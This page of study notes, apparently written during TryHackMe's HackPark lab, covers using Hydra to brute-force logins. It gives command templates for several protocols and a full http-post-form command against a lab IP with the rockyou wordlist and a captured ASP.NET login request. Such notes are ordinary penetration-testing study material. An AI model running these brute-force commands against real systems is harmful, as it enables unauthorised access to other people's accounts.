---
description: 'Learnt while doing tryhackme: HackPark'
---

# Hydra

This tool is not only good for brute-forcing HTTP forms, but other protocols such as FTP, SSH, SMTP, SMB and more.

Brute force against a protocol of your choice

hydra -P \<wordlist> -v  \<ip> \<protocol>&#x20;

You can use Hydra to bruteforce usernames as well as passwords. It will loop through every combination in your lists. (-vV = verbose mode, showing login attempts)&#x20;

`hydra -l username -P <list.txt> $ip`

`hydra -L <list of names.txt> -P <list of pass.txt> $ip`

`hydra -L <list of names.txt> -p password $ip`

If there is a POST login form, we have to add additional parameters:

`hydra -l username -P <list of pass.txt> $ip http-post-form <request parameter>`

Forming request parameter is tricky. It is of the following format: "\<path to login form>:\<body, with magic strings ^USER^ and ^PASS^>:\<pattern that appears in an invalid login>"

For example:

`hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.48.9 http-post-form "`**`/Account/login.aspx`**`:`_`__VIEWSTATE=upmW%2BRd1kp%2FuFvqvjgztXaWobqspUvA8R3ASyLKEtXsEA3Yn%2BEdasIemSbn5Nh4rJxVrpJ7WRGmJfUHR88FnZf0E%2BNJw0NUd3kk2E5PoNH3xcYS7Zg7%2F%2FDIE4ncaGiT5cA7Suh%2BSgnJVS%2BOqymaBLas08XSOKZ%2FaXYtXlPT810wUHGFl&__EVENTVALIDATION=pHkIX1YFfysu4I9S70KTag8FxEmxNZksn4IejfurCXDFwhSluMHCksHdcXqwuADk4PLVRKKnOAmQBHVzB%2BUh%2BL9fYjmvo6pXl1fZhOPFRC58GMraebipTWHkgdm1uLnIQaxORHzEydI8rec28lGDEDHDIBtn2ONAgX%2FuWpQa%2BC3vw0Ke&ctl00%24MainContent%24LoginUser%24UserName=`**`^USER^`**`&ctl00%24MainContent%24LoginUser%24Password=`**`^PASS^`**`&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in`_`:`**`Login failed`**`"`

^Here, /Account/login.aspx is the login page. VIEWSTATE=... is the body of the request as appeared in Burpsuite (in the bottom where it passes parameters) and ^USER^ and ^PASS^ are parameters to bruteforce (replaced from input files) and Login failed is the pattern observed in the response when wrong attempt made.
